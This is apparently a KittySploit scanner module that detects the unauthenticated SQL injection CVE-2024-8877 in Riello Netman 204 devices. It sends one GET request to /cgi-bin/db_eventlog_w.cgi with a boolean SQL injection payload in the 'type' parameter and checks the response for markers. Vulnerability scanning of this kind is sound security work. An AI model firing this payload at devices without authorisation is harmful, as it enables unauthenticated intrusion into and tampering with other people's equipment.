#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The three endpoints /cgi-bin/db_datalog_w."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Riello Netman 204 - SQL Injection Detection',
        'description': 'The three endpoints /cgi-bin/db_datalog_w.cgi, /cgi-bin/db_eventlog_w.cgi, and /cgi-bin/db_multimetr_w.cgi are vulnerable to SQL injection without prior authentication. This enables an attacker to modify the collected log data in an arbitrary way.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'netman', 'sqli', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://cyberdanube.com/en/en-multiple-vulnerabilities-in-riello-netman-204/index.html',
            'https://0day.today/exploit/39757',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-8877',
        ],
        'cve': 'CVE-2024-8877',
    }

    def run(self):
        r = self.http_request(method="GET", path='/cgi-bin/db_eventlog_w.cgi?date_start=0&date_end=1715630160&gravity=%25&type=%25%27and/**/%271%27=%271', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('START APPLICATION', 'category\\', ':')
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='critical',
                reason="Riello Netman 204 - SQL Injection detected",
                path='/cgi-bin/db_eventlog_w.cgi?date_start=0&date_end=1715630160&gravity=%25&type=%25%27and/**/%271%27=%271',
            )
            return True
        return False

